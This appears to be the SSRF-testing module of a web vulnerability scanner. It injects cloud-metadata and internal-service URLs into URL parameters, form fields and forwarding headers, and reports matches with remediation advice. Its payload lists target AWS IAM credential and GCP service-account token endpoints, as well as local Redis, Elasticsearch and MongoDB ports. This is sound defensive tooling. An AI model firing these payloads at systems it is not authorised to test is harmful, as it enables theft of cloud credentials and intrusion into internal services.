import httpx
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import List
from scanner.core.scan_result import Finding, Severity
from scanner.core.crawler import CrawlResult
from scanner.utils.payloads import load_payloads

_header_probed_hosts: set = set()


def reset() -> None:
    _header_probed_hosts.clear()

_DEFAULT_CANARY = "kagesec-canary.invalid"

_HARDCODED_URL_PARAMS = {"url", "redirect", "next", "src", "href", "image", "uri", "path", "dest", "target", "fetch", "load", "file", "link", "proxy"}

_HARDCODED_CLOUD = [
    ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "instance-type"], "AWS IMDS v1"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", ["AccessKeyId", "SecretAccessKey"], "AWS IAM credentials"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", ["compute", "vmId", "subscriptionId"], "Azure IMDS"),
    ("http://metadata.google.internal/computeMetadata/v1/", ["computeMetadata", "project", "instance"], "GCP metadata"),
    ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", ["access_token", "token_type"], "GCP service account token"),
]

_HARDCODED_INTERNAL = [
    ("http://127.0.0.1/", None, "localhost"),
    ("http://localhost/", None, "localhost"),
    ("http://0.0.0.0/", None, "all-interfaces"),
    ("http://127.0.0.1:8080/", None, "localhost:8080"),
    ("http://127.0.0.1:9200/", ["elasticsearch", "cluster_name"], "Elasticsearch"),
    ("http://127.0.0.1:6379/", ["-ERR", "+PONG"], "Redis"),
    ("http://127.0.0.1:27017/", ["mongod", "MongoDB"], "MongoDB"),
]

def _load_ssrf_data():
    data = load_payloads("ssrf")
    if not data:
        return _HARDCODED_CLOUD, _HARDCODED_INTERNAL, _HARDCODED_URL_PARAMS
    try:
        cloud = [(p["url"], p.get("signatures"), p["label"]) for p in data.get("cloud_payloads", [])]
        internal = [(p["url"], p.get("signatures"), p["label"]) for p in data.get("internal_payloads", [])]
        params = set(data.get("ssrf_params", []))
        return (cloud or _HARDCODED_CLOUD,
                internal or _HARDCODED_INTERNAL,
                params or _HARDCODED_URL_PARAMS)
    except (KeyError, TypeError):
        return _HARDCODED_CLOUD, _HARDCODED_INTERNAL, _HARDCODED_URL_PARAMS

CLOUD_PAYLOADS, INTERNAL_PAYLOADS, URL_PARAMS = _load_ssrf_data()

SSRF_HEADERS = ["X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Remote-IP", "X-Client-IP", "True-Client-IP"]


def test(page: CrawlResult, client: httpx.Client, oob=None) -> List[Finding]:
    findings = []
    parsed = urlparse(page.url)
    params = parse_qs(parsed.query)

    # URL parameter injection
    for param_name in list(params.keys()):
        if param_name.lower() not in URL_PARAMS:
            continue
        _test_param(page.url, parsed, params, param_name, client, findings)

    # Form-based SSRF
    for form in page.forms:
        for inp in form["inputs"]:
            if inp["name"] and inp["name"].lower() in URL_PARAMS:
                _test_form_param(form, inp["name"], client, findings)

    # Header-based SSRF — run once per host, not per page
    parsed_host = urlparse(page.url)
    host_key = f"{parsed_host.scheme}://{parsed_host.netloc}"
    if host_key not in _header_probed_hosts:
        _header_probed_hosts.add(host_key)
        _test_header_ssrf(page.url, client, findings)

    # Blind SSRF via OOB canary (DNS/HTTP callback)
    if oob:
        canary = oob.get_canary()
        canary_payloads = [
            f"http://{canary}/ssrf",
            f"https://{canary}/ssrf",
            f"//{canary}/ssrf",
        ]
        for param_name in list(params.keys()):
            if param_name.lower() not in URL_PARAMS:
                continue
            for canary_payload in canary_payloads:
                new_params = dict(params)
                new_params[param_name] = [canary_payload]
                test_url = urlunparse(parsed._replace(query=urlencode(new_params, doseq=True)))
                try:
                    client.get(test_url, timeout=5)
                except Exception:
                    pass

    return findings


def _test_param(original_url, parsed, params, param_name, client, findings):
    for payload, signatures, label in CLOUD_PAYLOADS + INTERNAL_PAYLOADS:
        new_params = dict(params)
        new_params[param_name] = [payload]
        test_url = urlunparse(parsed._replace(query=urlencode(new_params, doseq=True)))
        try:
            resp = client.get(test_url, timeout=5)
        except Exception:
            continue
        if signatures:
            matched = next((s for s in signatures if s in resp.text), None)
            if matched:
                findings.append(_finding(original_url, param_name, payload, label, matched))
                return
        # No signature list means this is an internal/generic target — require explicit
        # content match rather than status+length, which produces SPA false positives.


def _test_form_param(form, param_name, client, findings):
    for payload, signatures, label in CLOUD_PAYLOADS:
        data = {i["name"]: i.get("value", "") for i in form["inputs"] if i["name"]}
        data[param_name] = payload
        try:
            method = form["method"].upper()
            resp = client.request(method, form["action"], data=data, timeout=5)
        except Exception:
            continue
        if signatures:
            matched = next((s for s in signatures if s in resp.text), None)
            if matched:
                findings.append(_finding(form["action"], param_name, payload, label, matched))
                return


def _test_header_ssrf(url, client, findings):
    # Fetch a baseline without any injected header so we can confirm the
    # cloud-metadata signatures aren't already present in the page naturally.
    try:
        baseline = client.get(url, timeout=5)
        baseline_text = baseline.text
    except Exception:
        baseline_text = ""

    _CLOUD_SIGS = ["ami-id", "instance-id", "metadata", "iam/security-credentials"]
    internal_ips = ["127.0.0.1", "169.254.169.254", "10.0.0.1", "192.168.1.1"]
    for header in SSRF_HEADERS:
        for ip in internal_ips:
            try:
                resp = client.get(url, headers={header: ip})
            except Exception:
                continue
            # Only report if a cloud-metadata signature appears after injection
            # AND was absent from the baseline response.
            sig = next(
                (s for s in _CLOUD_SIGS if s in resp.text and s not in baseline_text),
                None,
            )
            if sig:
                findings.append(Finding(
                    title=f"SSRF via HTTP Header: {header}",
                    severity=Severity.HIGH,
                    url=url,
                    parameter=header,
                    payload=ip,
                    evidence=f"Cloud metadata signature '{sig}' appeared in response after injecting {header}: {ip} (absent in baseline)",
                    description=(
                        "The server uses a forwarded IP header to make internal requests, "
                        "allowing SSRF via header injection."
                    ),
                    remediation="Do not use client-supplied forwarding headers to determine request routing or targets.",
                    cwe="CWE-918",
                    cvss=7.5,
                    owasp_category="A10:2021 Server-Side Request Forgery",
                    standards=["ISO27001-8.23", "HIPAA-164.312a"],
                    confidence=1.0,
                ))
                return


def _finding(url, param, payload, label, matched):
    return Finding(
        title=f"Server-Side Request Forgery (SSRF) — {label}",
        severity=Severity.CRITICAL,
        url=url,
        parameter=param,
        payload=payload,
        evidence=f"Internal resource content detected: '{matched}'",
        description=(
            "SSRF allows attackers to make the server issue requests to internal infrastructure, "
            "including cloud metadata endpoints that expose credentials and instance information."
        ),
        remediation=(
            "Validate and whitelist allowed URL destinations. "
            "Block requests to internal IP ranges (169.254.x.x, 10.x.x.x, 192.168.x.x, 127.x.x.x). "
            "Use IMDSv2 on AWS (requires session token). "
            "Deploy a network egress firewall."
        ),
        cwe="CWE-918",
        cvss=9.8,
        owasp_category="A10:2021 Server-Side Request Forgery",
        standards=["ISO27001-8.23", "HIPAA-164.312a", "GDPR-Art32"],
        confidence=1.0,
    )
